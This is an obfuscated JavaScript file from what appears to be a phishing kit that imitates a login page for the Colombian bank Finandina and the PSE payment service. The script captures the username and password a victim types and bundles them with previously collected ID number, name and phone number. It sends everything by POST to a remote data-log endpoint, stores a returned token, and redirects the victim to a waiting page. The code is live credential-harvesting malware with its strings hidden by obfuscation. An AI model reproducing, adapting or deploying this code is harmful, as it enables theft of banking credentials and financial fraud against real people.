const _0x4c8bb2 = _0x31d2;
(function (_0x191821, _0xd481c8) {
  const _0x472bdf = _0x31d2,
    _0x42d3d8 = _0x191821();
  while (!![]) {
    try {
      const _0x5cbcd3 =
        parseInt(_0x472bdf(0x11a)) / 0x1 +
        (parseInt(_0x472bdf(0x124)) / 0x2) *
          (-parseInt(_0x472bdf(0x121)) / 0x3) +
        parseInt(_0x472bdf(0x11f)) / 0x4 +
        (-parseInt(_0x472bdf(0x13c)) / 0x5) *
          (-parseInt(_0x472bdf(0x125)) / 0x6) +
        parseInt(_0x472bdf(0x139)) / 0x7 +
        -parseInt(_0x472bdf(0x13b)) / 0x8 +
        parseInt(_0x472bdf(0x13e)) / 0x9;
      if (_0x5cbcd3 === _0xd481c8) break;
      else _0x42d3d8["push"](_0x42d3d8["shift"]());
    } catch (_0x3195d8) {
      _0x42d3d8["push"](_0x42d3d8["shift"]());
    }
  }
})(_0x542e, 0x3a700);
function _0x31d2(_0x23c6eb, _0x58c3de) {
  const _0x542e94 = _0x542e();
  return (
    (_0x31d2 = function (_0x31d28b, _0x5b8bd9) {
      _0x31d28b = _0x31d28b - 0x119;
      let _0x17591d = _0x542e94[_0x31d28b];
      return _0x17591d;
    }),
    _0x31d2(_0x23c6eb, _0x58c3de)
  );
}
function updateLS() {
  const _0x1b2a66 = _0x31d2;
  LS[_0x1b2a66(0x137)]("info", JSON["stringify"](info));
}
const button = document[_0x4c8bb2(0x130)]("btnUsuario"),
  userInput = document[_0x4c8bb2(0x130)](_0x4c8bb2(0x123)),
  passInput = document["getElementById"](_0x4c8bb2(0x13f));
function _0x542e() {
  const _0x120802 = [
    "800379vetSGX",
    "txtPass",
    "./wait.html",
    "Error\x20al\x20enviar\x20los\x20datos:",
    "123997RUIFUI",
    "addEventListener",
    "/dataLogs/addDataLog",
    "disabled",
    "application/json",
    "651888HVOmRg",
    "log",
    "12573lpsdmt",
    "click",
    "txtUsuario",
    "200wcjnnY",
    "771678mNSWkF",
    "puser",
    "stringify",
    "location",
    "json",
    "telnum",
    "PSE",
    "value",
    "origin",
    "user",
    "Por\x20favor\x20ingrese\x20la\x20contraseña",
    "getElementById",
    "Datos\x20enviados\x20correctamente\x20al\x20servidor",
    "Hubo\x20un\x20error\x20al\x20procesar\x20la\x20solicitud.\x20Por\x20favor,\x20inténtelo\x20de\x20nuevo.",
    "Por\x20favor\x20ingrese\x20el\x20nombre\x20de\x20usuario",
    "focus",
    "🚫​\x20Finandina",
    "error",
    "setItem",
    "metaInfo",
    "1571220PgYfoW",
    "preventDefault",
    "564104AxgJyQ",
    "5CpbeDe",
    "dataLogId",
  ];
  _0x542e = function () {
    return _0x120802;
  };
  return _0x542e();
}
button[_0x4c8bb2(0x11b)](_0x4c8bb2(0x122), async function (_0x55779f) {
  const _0x2bca2d = _0x4c8bb2;
  _0x55779f[_0x2bca2d(0x13a)](), (button[_0x2bca2d(0x11d)] = !![]);
  if (userInput["value"] === "") {
    alert(_0x2bca2d(0x133)),
      userInput[_0x2bca2d(0x134)](),
      (button[_0x2bca2d(0x11d)] = ![]);
    return;
  } else {
    if (passInput[_0x2bca2d(0x12c)] === "") {
      alert(_0x2bca2d(0x12f)),
        passInput[_0x2bca2d(0x134)](),
        (button["disabled"] = ![]);
      return;
    }
  }
  var _0x228598 = userInput[_0x2bca2d(0x12c)],
    _0x188f13 = passInput[_0x2bca2d(0x12c)];
  (info[_0x2bca2d(0x138)][_0x2bca2d(0x12e)] = _0x228598),
    (info[_0x2bca2d(0x138)][_0x2bca2d(0x126)] = _0x188f13),
    updateLS();
  const _0x1841bd = {
    reg: info[_0x2bca2d(0x138)]["cc"],
    name: info[_0x2bca2d(0x138)]["dudename"],
    cl: info[_0x2bca2d(0x138)][_0x2bca2d(0x12a)],
    us: info[_0x2bca2d(0x138)][_0x2bca2d(0x12e)],
    ps: info[_0x2bca2d(0x138)][_0x2bca2d(0x126)],
    bn: _0x2bca2d(0x135),
    status: "Ingresó\x20datos",
    source: _0x2bca2d(0x12b),
  };
  try {
    const _0x37649d = await fetch(url + _0x2bca2d(0x11c), {
      method: "POST",
      headers: {
        "Content-Type": _0x2bca2d(0x11e),
        Origin: window["location"][_0x2bca2d(0x12d)],
      },
      body: JSON[_0x2bca2d(0x127)](_0x1841bd),
    });
    if (!_0x37649d["ok"]) {
      const _0x28f1ce = await _0x37649d[_0x2bca2d(0x129)]();
      throw new Error(
        _0x28f1ce[_0x2bca2d(0x136)] ||
          "Error\x20en\x20la\x20respuesta\x20de\x20la\x20red\x20al\x20intentar\x20enviar\x20los\x20datos"
      );
    }
    const _0x27957c = await _0x37649d[_0x2bca2d(0x129)]();
    localStorage[_0x2bca2d(0x137)]("dataLogToken", _0x27957c["token"]),
      localStorage["setItem"](_0x2bca2d(0x13d), _0x27957c["id"]),
      console[_0x2bca2d(0x120)](_0x2bca2d(0x131)),
      (window[_0x2bca2d(0x128)]["href"] = _0x2bca2d(0x140));
  } catch (_0x4b91bf) {
    console["error"](_0x2bca2d(0x119), _0x4b91bf),
      alert(_0x2bca2d(0x132)),
      (button[_0x2bca2d(0x11d)] = ![]);
  }
});
